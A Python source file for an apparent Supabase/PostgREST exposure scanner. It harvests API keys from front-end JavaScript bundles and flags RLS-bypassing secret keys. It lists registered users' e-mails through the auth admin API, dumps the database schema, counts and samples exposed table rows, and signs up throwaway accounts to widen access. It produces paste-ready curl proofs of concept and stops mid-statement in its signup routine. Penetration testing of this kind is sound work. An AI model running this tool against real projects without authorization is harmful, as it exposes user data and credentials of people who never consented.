#!/usr/bin/env python3
"""
supahunt.py - Supabase / PostgREST exposure extractor.

A Supabase project is a PostgreSQL database with six HTTP services bolted on,
and exactly one thing standing between the internet and the data: Row Level
Security. When RLS is missing, the publishable key that ships in the front-end
bundle is a full database credential.

What this does, in order:

  1. DISCOVER   the project and its keys - from the URL itself, from the page,
                and from the JavaScript bundles it loads.
  2. CLASSIFY   the keys. A legacy JWT decodes to its role; sb_secret_* and
                service_role BYPASS RLS entirely and are a critical finding on
                sight. (Secret keys are refused when the User-Agent looks like
                a browser, so they are tested with a neutral one.)
  3. INTROSPECT /rest/v1/ returns the OpenAPI document of the whole schema:
                every table, every column, every RPC. Free, and complete.
  4. MEASURE    each table with `Prefer: count=exact` and `Range: 0-0`. That
                returns the EXACT row count in the Content-Range header while
                pulling a single record. "48231 rows readable anonymously" is
                a report; dumping the table is a privacy incident.
  5. ESCALATE   many projects lock down the `anon` role and leave
                `authenticated` wide open, assuming only their own users
                exist - but /auth/v1/signup is usually public. With --signup
                the whole sweep is replayed as a freshly created user and the
                two passes are diffed.
  6. SPREAD     storage buckets and objects, RPC functions (listed, never
                called), pg_graphql on /graphql/v1, and the auth admin route
                that proves a secret key.

SAFETY - read only. No INSERT/UPDATE/DELETE. RPC functions are enumerated from
the OpenAPI document and never invoked, because a Postgres function does what
it wants. --check-write exists, is off by default, and reports the error code
it observed without concluding for you (see its help text). Sampling is one
row per table by default and values are truncated: the count is the impact,
the row is only the proof.

Stdlib only. TLS verification disabled. For authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import concurrent.futures
import json
import os
import random
import re
import ssl
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

VERSION = "1.0.0"
MAX_BODY = 2 * 1024 * 1024
MAX_JS = 3 * 1024 * 1024

BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
# Supabase refuses secret keys when the User-Agent looks like a browser.
NEUTRAL_UA = f"supahunt/{VERSION}"

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

# ----------------------------------------------------------------------------
# Signatures
# ----------------------------------------------------------------------------

PROJECT_RX = re.compile(r"https?://([a-z]{15,25})\.supabase\.(?:co|in|net)")
JWT_RX = re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"
                    r"\.[A-Za-z0-9_-]{8,}")
NEWKEY_RX = re.compile(r"\bsb_(publishable|secret)_[A-Za-z0-9_\-]{12,}")
SUPA_URL_HINT_RX = re.compile(
    r"(?i)(supabase[_-]?url|next_public_supabase_url|vite_supabase_url)"
    r"\W{1,6}([\"'])(https?://[^\"']+)\2")
SCRIPT_SRC_RX = re.compile(r"""<script[^>]+src=["']([^"']+)["']""", re.I)

# PostgREST / Postgres error codes worth telling apart.
ERR_MEANING = {
    "42501": "permission denied - RLS or GRANT is doing its job",
    "42P01": "relation does not exist",
    "PGRST301": "JWT invalid or expired",
    "PGRST302": "anonymous access disabled",
    "PGRST202": "function not found in the schema cache",
    "PGRST204": "column not found",
    "PGRST116": "no rows returned for a single-object request",
    "22P02": "invalid input syntax (the value never reached the policy)",
    "23502": "not-null violation (the statement got past the policy gate)",
    "23505": "unique violation (the statement got past the policy gate)",
    "23503": "foreign key violation (the statement got past the policy gate)",
}

# Table names that make a finding a report on their own.
HOT_TABLE_RX = re.compile(
    r"(?i)(user|account|customer|client|member|profile|employee|admin|"
    r"credential|password|token|secret|key|session|payment|invoice|order|"
    r"transaction|card|subscription|contact|lead|message|conversation|"
    r"document|file|audit|log|setting|config|consent|address|patient|"
    r"student|candidate|application|salary|contract)")


# ----------------------------------------------------------------------------
# Field-name classification (tokens, not substrings: "scope" must not fire on
# "horoscope" and "mfa" must not fire on "TermFacility")
# ----------------------------------------------------------------------------

def identifier_tokens(name):
    t = re.sub(r"[_\-.]+", " ", name or "")
    t = re.sub(r"(?<=[a-z0-9])(?=[A-Z])", " ", t)
    t = re.sub(r"(?<=[A-Z])(?=[A-Z][a-z])", " ", t)
    t = re.sub(r"(?<=[A-Za-z])(?=[0-9])", " ", t)
    return [p.lower() for p in t.split() if p]


STRONG_TOKENS = {
    "password", "passwd", "pwd", "passphrase", "secret", "secrets",
    "apikey", "accesskey", "privatekey", "clientsecret", "token", "tokens",
    "totp", "mfa", "2fa", "twofactor", "otp", "ssn", "iban", "cvv", "cvc",
    "passport", "jwt", "bearer", "credential", "credentials", "privkey",
}
KEY_QUALIFIERS = {"api", "access", "private", "secret", "signing", "signature",
                  "encryption", "client", "license", "auth", "session",
                  "refresh", "master", "consumer"}
WEAK_TOKENS = {"hash", "hashed", "salt", "scope", "scopes", "role", "roles",
               "permission", "permissions", "internal", "pin", "signature",
               "seed", "key", "keys", "acl"}
PII_TOKENS = {"email", "mail", "phone", "mobile", "msisdn", "address",
              "postal", "postcode", "zip", "birthdate", "birthday", "dob",
              "firstname", "lastname", "fullname", "surname", "givenname",
              "nationality", "siret", "siren", "nir", "ssn"}
NON_SECRET_TYPES = {"integer", "number", "boolean", "bigint", "smallint",
                    "timestamp", "timestamptz", "date", "time"}


def classify_name(name, type_hint=None):
    toks = identifier_tokens(name)
    if not toks:
        return None
    tset = set(toks)
    kind = None
    if tset & STRONG_TOKENS or "".join(toks) in STRONG_TOKENS:
        kind = "secret"
    elif "key" in tset and tset & KEY_QUALIFIERS:
        kind = "secret"
    elif ("pass" in tset or "password" in tset) and tset & {"hash", "hashed"}:
        kind = "secret"
    elif tset & WEAK_TOKENS:
        kind = "weak"
    elif tset & PII_TOKENS:
        kind = "pii"
    if kind == "secret" and (type_hint or "").lower() in NON_SECRET_TYPES:
        kind = "weak"
    return kind


# ----------------------------------------------------------------------------
# Output
# ----------------------------------------------------------------------------

class Colors:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GREY = "\033[90m"

    @classmethod
    def disable(cls):
        for a in ("RESET", "BOLD", "DIM", "RED", "GREEN", "YELLOW", "BLUE",
                  "MAGENTA", "CYAN", "GREY"):
            setattr(cls, a, "")


def sev_paint(sev):
    return {CRIT: Colors.RED + Colors.BOLD, HIGH: Colors.RED,
            MED: Colors.YELLOW, LOW: Colors.CYAN,
            INFO: Colors.GREY}.get(sev, "")


ANSI_RX = re.compile(r"\x1b\[[0-9;]*m")


@dataclass
class Finding:
    sev: str
    title: str
    url: str = ""
    impact: str = ""
    proof: list = field(default_factory=list)
    note: str = ""
    poc: str = ""
    chain: str = ""


class Reporter:
    """Everything printed is also appended to the -o log file."""

    def __init__(self, level=0, logfile=None):
        self.level = level
        self.lock = threading.Lock()
        self.fh = None
        if logfile:
            try:
                self.fh = open(logfile, "a", encoding="utf-8")
            except Exception as e:
                sys.stderr.write(f"cannot open {logfile}: {e}\n")

    def _emit(self, text):
        with self.lock:
            sys.stdout.write(text + "\n")
            sys.stdout.flush()
            if self.fh:
                try:
                    self.fh.write(ANSI_RX.sub("", text) + "\n")
                    self.fh.flush()
                except Exception:
                    pass

    def line(self, text=""):
        self._emit(text)

    def log_only(self, text):
        with self.lock:
            if self.fh:
                try:
                    self.fh.write(ANSI_RX.sub("", text) + "\n")
                    self.fh.flush()
                except Exception:
                    pass

    def banner(self, msg):
        self._emit(f"\n{Colors.BOLD}{Colors.BLUE}=== {msg} ==={Colors.RESET}")

    def finding(self, f: Finding):
        C, p = Colors, sev_paint(f.sev)
        out = [f"\n{p}[{f.sev}]{C.RESET} {C.BOLD}{f.title}{C.RESET}"]
        if f.url:
            out.append(f"  {C.DIM}URL     :{C.RESET} {f.url}")
        if f.impact:
            out.append(f"  {C.DIM}Impact  :{C.RESET} {f.impact}")
        if f.proof:
            out.append(f"  {C.DIM}Proof   :{C.RESET} {len(f.proof)} item(s)")
            for item in f.proof[:25]:
                out.append(f"      {C.GREEN}{item}{C.RESET}")
            if len(f.proof) > 25:
                out.append(f"      {C.DIM}... {len(f.proof) - 25} more "
                           f"(see the loot directory){C.RESET}")
        if f.note:
            out.append(f"  {C.DIM}Note    :{C.RESET} {f.note}")
        if f.chain:
            out.append(f"  {C.DIM}Chain   :{C.RESET} {C.MAGENTA}{f.chain}"
                       f"{C.RESET}")
        if f.poc:
            lines = f.poc.split("\n")
            out.append(f"  {C.DIM}PoC     :{C.RESET} {lines[0]}")
            for extra in lines[1:]:
                out.append(f"            {extra}")
        self._emit("\n".join(out))

    def test(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.DIM}[test] {msg}{Colors.RESET}")

    def info(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.CYAN}[info]{Colors.RESET} {msg}")

    def debug(self, msg):
        if self.level >= 2:
            self._emit(f"{Colors.GREY}[dbg] {msg}{Colors.RESET}")

    def warn(self, msg):
        self._emit(f"{Colors.YELLOW}[warn]{Colors.RESET} {msg}")

    def error(self, msg):
        self._emit(f"{Colors.RED}[err ]{Colors.RESET} {msg}")


class Status:
    def __init__(self, rep, total, interval=30.0, enabled=True):
        self.rep, self.total, self.interval = rep, total, interval
        self.enabled = enabled and total > 0
        self.done = 0
        self.findings = 0
        self.start = time.time()
        self.lock = threading.Lock()
        self._stop = threading.Event()
        self.thread = None

    def start_thread(self):
        if not self.enabled:
            return
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self):
        while not self._stop.wait(self.interval):
            self.emit()

    def target_done(self):
        with self.lock:
            self.done += 1

    def record(self, n=1):
        with self.lock:
            self.findings += n

    def emit(self):
        if not self.enabled:
            return
        el = int(time.time() - self.start)
        with self.lock:
            done, total, f = self.done, self.total, self.findings
        self.rep.line(f"{Colors.BLUE}[status {el // 60:02d}:{el % 60:02d}]"
                      f"{Colors.RESET}  tested {done}/{total}  "
                      f"remaining {total - done}  findings {f}")

    def stop(self):
        self._stop.set()
        if self.thread:
            self.thread.join(timeout=1)


# ----------------------------------------------------------------------------
# HTTP
# ----------------------------------------------------------------------------

@dataclass
class Response:
    status: int = 0
    body: str = ""
    headers: dict = field(default_factory=dict)
    error: str = ""
    elapsed: float = 0.0

    @property
    def ok(self):
        return not self.error

    def header(self, name, default=""):
        for k, v in self.headers.items():
            if k.lower() == name.lower():
                return v
        return default

    def json(self):
        b = (self.body or "").lstrip()
        if not (b.startswith("{") or b.startswith("[")):
            return None
        try:
            return json.loads(self.body)
        except Exception:
            return None


class Rate:
    def __init__(self, gap):
        self.gap = gap
        self.last = 0.0
        self.lock = threading.Lock()

    def wait(self):
        if self.gap <= 0:
            return
        with self.lock:
            delta = self.last + self.gap - time.time()
            if delta > 0:
                time.sleep(delta)
            self.last = time.time()


class Http:
    def __init__(self, timeout=15.0, proxy=None, headers=None, delay=0.0,
                 rep: Reporter = None):
        self.timeout = timeout
        self.proxy = proxy
        self.rep = rep
        self.rate = Rate(delay)
        self.extra = {}
        for h in headers or []:
            if ":" in h:
                k, v = h.split(":", 1)
                self.extra[k.strip()] = v.strip()
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self._opener = None
        self._lock = threading.Lock()
        self.count = 0

    def opener(self):
        with self._lock:
            if self._opener is None:
                handlers = [urllib.request.HTTPSHandler(context=self.ctx)]
                if self.proxy:
                    handlers.append(urllib.request.ProxyHandler(
                        {"http": self.proxy, "https": self.proxy}))
                else:
                    handlers.append(urllib.request.ProxyHandler({}))
                self._opener = urllib.request.build_opener(*handlers)
            return self._opener

    def request(self, method, url, body=None, headers=None,
                max_read=MAX_BODY) -> Response:
        with self._lock:
            self.count += 1
        self.rate.wait()
        hdrs = {"User-Agent": BROWSER_UA, "Accept": "*/*",
                "Accept-Encoding": "identity"}
        hdrs.update(self.extra)
        hdrs.update(headers or {})
        data = body.encode("utf-8", "replace") if isinstance(body, str) else body
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in hdrs.items():
            if v is None:
                continue
            req.remove_header(k)
            req.add_header(k, v)
        t0 = time.time()
        try:
            with self.opener().open(req, timeout=self.timeout) as r:
                raw = r.read(max_read)
                resp = Response(status=r.status,
                                body=raw.decode("utf-8", "replace"),
                                headers=dict(r.headers),
                                elapsed=time.time() - t0)
        except urllib.error.HTTPError as e:
            try:
                raw = e.read(max_read)
            except Exception:
                raw = b""
            resp = Response(status=e.code, body=raw.decode("utf-8", "replace"),
                            headers=dict(e.headers or {}),
                            elapsed=time.time() - t0)
        except Exception as e:
            resp = Response(error=f"{type(e).__name__}: {e}",
                            elapsed=time.time() - t0)
        if self.rep:
            self.rep.debug(f"{method} {url[:150]} -> "
                           f"{resp.status if resp.ok else resp.error[:50]} "
                           f"{len(resp.body)}b {resp.elapsed*1000:.0f}ms")
        if resp.ok and resp.status == 429:
            wait = 2.0
            try:
                wait = min(20.0, float(resp.header("Retry-After") or 2))
            except ValueError:
                pass
            time.sleep(wait)
        return resp


# ----------------------------------------------------------------------------
# Keys and identities
# ----------------------------------------------------------------------------

HOP_BY_HOP = {"connection", "keep-alive", "proxy-authenticate", "te",
              "trailer", "transfer-encoding", "upgrade", "content-length",
              "accept-encoding", "host"}


def b64pad(s):
    return s + "=" * (-len(s) % 4)


def decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        raw = base64.urlsafe_b64decode(b64pad(parts[1]))
        return json.loads(raw.decode("utf-8", "replace"))
    except (ValueError, binascii.Error, UnicodeDecodeError):
        return None


@dataclass
class Key:
    value: str
    kind: str = "unknown"      # anon | service_role | publishable | secret |
                               # user | unknown
    ref: str = ""
    exp: int = 0
    source: str = ""

    @property
    def bypasses_rls(self):
        return self.kind in ("service_role", "secret")

    @property
    def ua(self):
        # secret keys are rejected when the User-Agent looks like a browser
        return NEUTRAL_UA if self.bypasses_rls else BROWSER_UA

    def label(self):
        bits = [self.kind]
        if self.ref:
            bits.append(f"ref={self.ref}")
        if self.exp:
            bits.append("expired" if self.exp < time.time()
                        else time.strftime("exp=%Y-%m-%d",
                                           time.gmtime(self.exp)))
        return " ".join(bits)


def classify_key(value, source=""):
    v = (value or "").strip()
    m = NEWKEY_RX.match(v)
    if m:
        return Key(value=v, kind=("secret" if m.group(1) == "secret"
                                  else "publishable"), source=source)
    payload = decode_jwt(v) if v.startswith("eyJ") else None
    if not payload:
        return None
    role = str(payload.get("role") or "")
    kind = role if role in ("anon", "service_role", "authenticated") else "user"
    if kind == "authenticated":
        kind = "user"
    return Key(value=v, kind=kind, ref=str(payload.get("ref") or ""),
               exp=int(payload.get("exp") or 0), source=source)


@dataclass
class Identity:
    name: str
    key: Key = None                       # the apikey
    bearer: str = ""                      # Authorization: Bearer <...>
    headers: dict = field(default_factory=dict)

    def auth_headers(self):
        h = dict(self.headers)
        if self.key:
            h["apikey"] = self.key.value
            h["Authorization"] = f"Bearer {self.bearer or self.key.value}"
            h["User-Agent"] = self.key.ua
        elif self.bearer:
            h["Authorization"] = f"Bearer {self.bearer}"
        return h


def parse_raw_request(path, force_ssl=False):
    with open(path, "rb") as fh:
        raw = fh.read().decode("utf-8", "replace")
    raw = raw.replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = [l for l in head.split("\n") if l.strip()]
    if not lines:
        raise ValueError(f"{path}: empty request file")
    parts = lines[0].split()
    if len(parts) < 2:
        raise ValueError(f"{path}: cannot parse the request line")
    method, target = parts[0].upper(), parts[1]
    headers, host = {}, ""
    for line in lines[1:]:
        if ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip(), v.strip()
        if k.lower() == "host":
            host = v
            continue
        if k.lower() in HOP_BY_HOP:
            continue
        headers[k] = v
    if target.startswith("http://") or target.startswith("https://"):
        url = target
    else:
        scheme = "https" if force_ssl else "http"
        if not force_ssl:
            for ref in ("Origin", "Referer"):
                if headers.get(ref, "").startswith("https://"):
                    scheme = "https"
                    break
            else:
                if host.endswith(":443"):
                    scheme = "https"
        if not host:
            raise ValueError(f"{path}: no Host header and no absolute URL")
        url = f"{scheme}://{host}{target}"
    return url, method, headers, body


def identity_from_request(path, force_ssl=False):
    """A captured request carries the project URL, the apikey and, very often,
    a logged-in user's JWT - a third identity for free."""
    url, method, headers, body = parse_raw_request(path, force_ssl)
    split = urllib.parse.urlsplit(url)
    base = f"{split.scheme}://{split.netloc}"
    apikey = bearer = ""
    for k, v in headers.items():
        if k.lower() == "apikey":
            apikey = v
        elif k.lower() == "authorization" and v.lower().startswith("bearer "):
            bearer = v[7:].strip()
    if not apikey:
        qs = urllib.parse.parse_qs(split.query)
        apikey = (qs.get("apikey") or [""])[0]
    key = classify_key(apikey, source=path) if apikey else None
    keep = {k: v for k, v in headers.items()
            if k.lower() not in ("content-type", "content-length", "apikey",
                                 "authorization", "user-agent")}
    ident = Identity(name="captured", key=key, bearer=bearer, headers=keep)
    return base, ident


# ----------------------------------------------------------------------------
# PostgREST helpers
# ----------------------------------------------------------------------------

def pg_error(resp: Response):
    """(code, message) from a PostgREST error body."""
    obj = resp.json()
    if not isinstance(obj, dict):
        return "", ""
    code = str(obj.get("code") or "")
    msg = str(obj.get("message") or obj.get("msg") or obj.get("error") or "")
    if not code and not msg:
        return "", ""
    return code, msg[:250]


def content_range_total(resp: Response):
    """`Content-Range: 0-0/48231` -> 48231. '*' means the count was not asked
    for or is unknown."""
    cr = resp.header("Content-Range", "")
    m = re.search(r"/(\d+)\s*$", cr)
    if m:
        return int(m.group(1))
    return None


# ----------------------------------------------------------------------------
# The hunter
# ----------------------------------------------------------------------------

class SupaHunter:
    def __init__(self, http: Http, rep: Reporter, args, status=None):
        self.http = http
        self.rep = rep
        self.args = args
        self.status = status
        self.findings = []
        self.lock = threading.Lock()

    # -- reporting ----------------------------------------------------------

    def add(self, f: Finding):
        with self.lock:
            self.findings.append(f)
        self.rep.finding(f)
        if self.status:
            self.status.record()

    def lootdir(self, base_url):
        if not self.args.loot:
            return None
        p = urllib.parse.urlsplit(base_url)
        slug = re.sub(r"[^A-Za-z0-9.\-_]", "_",
                      p.hostname or "target").strip("_")
        d = os.path.join(self.args.loot, slug)
        try:
            os.makedirs(d, exist_ok=True)
            return d
        except Exception as e:
            if not getattr(self, "_loot_warned", False):
                self._loot_warned = True
                self.rep.warn(f"cannot create {d}: {e} - loot disabled")
            return None

    def write(self, base_url, name, text):
        d = self.lootdir(base_url)
        if not d:
            return None
        path = os.path.join(d, name)
        try:
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text if text.endswith("\n") else text + "\n")
            self.rep.info(f"wrote {path}")
            return path
        except Exception as e:
            self.rep.warn(f"cannot write {path}: {e}")
            return None

    def append_poc(self, base_url, title, curl):
        d = self.lootdir(base_url)
        if not d:
            return
        try:
            with open(os.path.join(d, "pocs.txt"), "a",
                      encoding="utf-8") as fh:
                fh.write(f"\n{'=' * 72}\n{title}\n{'=' * 72}\n\n{curl}\n")
        except Exception:
            pass

    # -- request helpers ----------------------------------------------------

    def call(self, url, identity: Identity, method="GET", body=None,
             extra=None, max_read=MAX_BODY):
        headers = identity.auth_headers()
        if body is not None:
            headers["Content-Type"] = "application/json"
        headers.update(extra or {})
        return self.http.request(method, url, body, headers, max_read=max_read)

    @staticmethod
    def curl_for(url, identity: Identity, extra=None, prefix=True):
        """
        The key is long enough to make a one-liner unreadable, so it goes in
        a shell variable. What comes out is meant to be pasted into a report
        and into a terminal, unchanged.
        """
        head = []
        bits = [f"curl -sk {shell_quote(url)}"]
        key = identity.key.value if identity.key else ""
        bearer = identity.bearer or key
        if key:
            head.append(f"KEY={shell_quote(key)}")
            bits.append('-H "apikey: $KEY"')
            if bearer == key:
                bits.append('-H "Authorization: Bearer $KEY"')
        if bearer and bearer != key:
            head.append(f"TOKEN={shell_quote(bearer)}")
            bits.append('-H "Authorization: Bearer $TOKEN"')
        if identity.key and identity.key.bypasses_rls:
            bits.append("-H " + shell_quote(f"User-Agent: {NEUTRAL_UA}")
                        + "   # a browser UA gets this key refused")
        for k, v in (identity.headers or {}).items():
            if k.lower() in ("accept-encoding", "user-agent"):
                continue
            bits.append("-H " + shell_quote(f"{k}: {v}"))
        for k, v in (extra or {}).items():
            bits.append("-H " + shell_quote(f"{k}: {v}"))
        line = " ".join(bits)
        if head and prefix:
            return "\n".join(head) + "\n" + line
        return line

    # -- 1. discovery -------------------------------------------------------

    def discover(self, target):
        """(base_url, [Key]) - from the URL, the page, and its bundles."""
        url = target if "://" in target else "https://" + target
        split = urllib.parse.urlsplit(url)
        keys, bases = [], []

        m = PROJECT_RX.match(f"{split.scheme}://{split.netloc}")
        if m:
            bases.append(f"{split.scheme}://{split.netloc}")

        # self-hosted or custom domain: does /rest/v1/ answer like PostgREST?
        probe = self.http.request(
            "GET", f"{split.scheme}://{split.netloc}/rest/v1/",
            max_read=64 * 1024)
        if probe.ok and probe.status in (200, 400, 401) and \
                self.looks_postgrest(probe):
            bases.append(f"{split.scheme}://{split.netloc}")

        # the page and its bundles
        page = self.http.request("GET", url, max_read=MAX_JS)
        blobs = []
        if page.ok and page.body:
            blobs.append(page.body)
            srcs = SCRIPT_SRC_RX.findall(page.body)[:self.args.max_scripts]
            for src in srcs:
                full = urllib.parse.urljoin(url, src)
                if not full.startswith(("http://", "https://")):
                    continue
                r = self.http.request("GET", full, max_read=MAX_JS)
                if r.ok and r.body:
                    blobs.append(r.body)
                    self.rep.test(f"read {full[:110]} ({len(r.body)}b)")

        for blob in blobs:
            for pm in PROJECT_RX.finditer(blob):
                b = pm.group(0)
                if b not in bases:
                    bases.append(b)
            for hm in SUPA_URL_HINT_RX.finditer(blob):
                b = hm.group(3).rstrip("/")
                if b and b not in bases:
                    bases.append(b)
            for km in NEWKEY_RX.finditer(blob):
                k = classify_key(km.group(0), source="javascript bundle")
                if k and k.value not in [x.value for x in keys]:
                    keys.append(k)
            for jm in JWT_RX.finditer(blob):
                k = classify_key(jm.group(0), source="javascript bundle")
                if k and k.kind in ("anon", "service_role") and \
                        k.value not in [x.value for x in keys]:
                    keys.append(k)

        base = bases[0] if bases else ""
        if base and not base.startswith("http"):
            base = "https://" + base
        return base.rstrip("/"), keys

    @staticmethod
    def looks_postgrest(resp: Response):
        obj = resp.json()
        if isinstance(obj, dict):
            if "swagger" in obj or "openapi" in obj:
                return True
            if obj.get("code") in ("PGRST301", "PGRST302", "42501"):
                return True
            msg = str(obj.get("message", "")).lower()
            if "no api key" in msg or "jwt" in msg or "api key" in msg:
                return True
        srv = resp.header("Server", "").lower()
        return "postgrest" in srv

    # -- 2. keys ------------------------------------------------------------

    def report_keys(self, base, keys):
        for k in keys:
            if k.bypasses_rls:
                self.add(Finding(
                    sev=CRIT,
                    title=f"Key that BYPASSES Row Level Security exposed "
                          f"({k.kind})",
                    url=base,
                    impact="This key is the database. It ignores every RLS "
                           "policy, reads and writes every table, and lists "
                           "every account through the auth admin API. It "
                           "must never leave a backend.",
                    proof=[f"{k.kind}: {k.value[:48]}...",
                           f"found in: {k.source}",
                           f"claims: {k.label()}"],
                    note="tested with a neutral User-Agent: Supabase refuses "
                         "secret keys when the UA looks like a browser",
                    chain="GET /auth/v1/admin/users confirms it and lists "
                          "every registered account"))
            else:
                self.add(Finding(
                    sev=INFO,
                    title=f"Supabase key found ({k.kind})",
                    url=base,
                    impact="Publishable by design - it is only as safe as "
                           "the RLS policies behind it, which is what the "
                           "rest of this run measures.",
                    proof=[f"{k.label()}", f"found in: {k.source}"]))

    def confirm_secret(self, base, identity):
        r = self.call(f"{base}/auth/v1/admin/users?page=1&per_page=1",
                      identity, max_read=64 * 1024)
        obj = r.json()
        if r.ok and r.status == 200 and isinstance(obj, dict) and \
                "users" in obj:
            total = obj.get("total") or len(obj.get("users") or [])
            sample = ""
            users = obj.get("users") or []
            if users and isinstance(users[0], dict):
                sample = str(users[0].get("email", ""))[:60]
            self.add(Finding(
                sev=CRIT,
                title="Auth admin API reachable - every account is listable",
                url=f"{base}/auth/v1/admin/users",
                impact="Confirms the key bypasses RLS, and hands over the "
                       "full user directory with e-mail addresses.",
                proof=[f"total users: {total}"] +
                      ([f"first e-mail: {sample}"] if sample else []),
                poc=self.curl_for(f"{base}/auth/v1/admin/users", identity)))
            return True
        return False

    # -- 3. OpenAPI ---------------------------------------------------------

    def openapi(self, base, identity):
        r = self.call(f"{base}/rest/v1/", identity, max_read=MAX_BODY)
        obj = r.json()
        if not isinstance(obj, dict) or not (obj.get("paths")
                                             or obj.get("definitions")):
            code, msg = pg_error(r)
            if code:
                self.rep.info(f"/rest/v1/ refused: {code} {msg[:90]}")
            return None
        return obj

    @staticmethod
    def split_openapi(spec):
        """-> (tables{name: [(col, type)]}, rpcs[name])"""
        tables, rpcs = {}, []
        defs = spec.get("definitions") or {}
        for name, body in defs.items():
            props = (body or {}).get("properties") or {}
            cols = [(c, str((p or {}).get("format")
                            or (p or {}).get("type") or ""))
                    for c, p in props.items()]
            tables[name] = cols
        for path in (spec.get("paths") or {}):
            if path.startswith("/rpc/"):
                rpcs.append(path[5:])
            elif path.startswith("/") and len(path) > 1:
                tables.setdefault(path[1:], [])
        tables.pop("", None)
        return tables, rpcs

    # -- 4. the sweep -------------------------------------------------------

    def probe_table(self, base, identity, table, cols):
        """One request: exact row count, and one sample row at most."""
        sel = "*"
        url = (f"{base}/rest/v1/{urllib.parse.quote(table)}"
               f"?select={sel}&limit={max(1, self.args.sample)}")
        r = self.call(url, identity,
                      extra={"Prefer": "count=exact",
                             "Range-Unit": "items",
                             "Range": f"0-{max(0, self.args.sample - 1)}"},
                      max_read=256 * 1024)
        code, msg = pg_error(r)
        total = content_range_total(r)
        rows = r.json() if r.ok else None
        if not isinstance(rows, list):
            rows = None
        return {"table": table, "status": r.status, "code": code, "msg": msg,
                "total": total, "rows": rows, "url": url, "cols": cols}

    def sweep(self, base, identity, tables, label):
        results, budget = [], self.args.max_tables
        ordered = sorted(tables, key=lambda t: (0 if HOT_TABLE_RX.search(t)
                                                else 1, t))
        for table in ordered[:budget]:
            res = self.probe_table(base, identity, table, tables[table])
            results.append(res)
            if res["rows"]:
                self.rep.test(f"[{label}] {table}: {res['total']} row(s) "
                              f"readable")
            else:
                self.rep.test(f"[{label}] {table}: {res['code'] or res['status']}"
                              f" {ERR_MEANING.get(res['code'], '')}")
        return results

    def report_sweep(self, base, identity, results, label):
        exposed = [r for r in results if r["rows"]]
        empty = [r for r in results if r["rows"] == []]
        denied = [r for r in results if r["code"] == "42501"]
        if not exposed:
            self.rep.info(f"[{label}] no table returned rows "
                          f"({len(denied)} denied, {len(empty)} empty or "
                          f"filtered)")
            return []

        lines, hot = [], []
        for r in exposed:
            cols = [c for c, _ in r["cols"]]
            kinds = {c: classify_name(c, t) for c, t in r["cols"]}
            sens = [c for c in cols if kinds.get(c) in ("secret", "pii")]
            n = r["total"] if r["total"] is not None else "?"
            lines.append(f"{r['table']}: {n} row(s)"
                         + (f"   sensitive columns: {', '.join(sens[:8])}"
                            if sens else ""))
            if sens or HOT_TABLE_RX.search(r["table"]):
                hot.append((r, sens))

        self.write(base, f"tables-{label}.txt", "\n".join(lines))

        biggest = max((r["total"] or 0) for r in exposed)
        sev = CRIT if hot else HIGH
        proof = []
        for r, sens in (hot or [(x, []) for x in exposed])[:12]:
            n = r["total"] if r["total"] is not None else "?"
            proof.append(f"{r['table']}: {n} row(s)"
                         + (f"   [{', '.join(sens[:6])}]" if sens else ""))
        first = (hot[0][0] if hot else exposed[0])
        sample = self.redact(first)
        if sample:
            proof.append(f"sample from {first['table']}: {sample}")

        self.add(Finding(
            sev=sev,
            title=f"{len(exposed)} table(s) readable as '{label}' - RLS is "
                  f"missing or permissive",
            url=f"{base}/rest/v1/",
            impact="Every one of these is served to anyone holding the "
                   "publishable key, which ships in the front-end bundle. "
                   "The row counts below were read from Content-Range; no "
                   "table was dumped.",
            proof=proof,
            note=f"largest exposed table: {biggest} rows; full list in "
                 f"tables-{label}.txt",
            poc=self.poc_line(first, identity)))
        return exposed

    def redact(self, res):
        """One row, truncated, with secret-looking values masked."""
        rows = res.get("rows") or []
        if not rows or not isinstance(rows[0], dict):
            return ""
        kinds = {c: classify_name(c, t) for c, t in res["cols"]}
        out = {}
        for k, v in list(rows[0].items())[:10]:
            if v is None:
                continue
            if kinds.get(k) == "secret":
                t = str(v)
                out[k] = (t[:6] + "...") if len(t) > 6 else "..."
            elif isinstance(v, str) and len(v) > 60:
                out[k] = v[:60] + "..."
            else:
                out[k] = v
        return json.dumps(out, ensure_ascii=False)[:300]

    def poc_line(self, res, identity):
        curl = self.curl_for(res["url"], identity,
                             extra={"Prefer": "count=exact",
                                    "Range": "0-0"})
        return ("count  " + curl + "\n"
                + "note   Range: 0-0 returns the exact total in "
                  "Content-Range without pulling the table")

    # -- 5. escalation ------------------------------------------------------

    def signup(self, base, identity):
        """A public signup turns the `anon` sweep into an `authenticated`
        one, which is very often a different world."""
        email = self.args.signup_email or (
            "supahunt_" + "".join(random.choices(string.ascii_lowercase +
                                                 string.digits, k=10))
            + "@example.com")
        pwd = "".join(random.choices(string.ascii_letters + string.digits,
                                     k=18)) + "!aA1"
        body = json.dumps({"email": email, "password": pwd})
        r = self.call(f"{base}/auth/v1/signup", identity, method="POST",
                      body=body, max_read=64 * 1024)
        obj = r.json() or {}
        token = ""
        if isinstance(obj, dict):
            token = obj.get("access_token") or ""
            if not token and isinstance(obj.get("session"), dict):
                token = obj["session"].get("access_token") or ""
        if token:
            self.add(Finding(
                sev=MED,
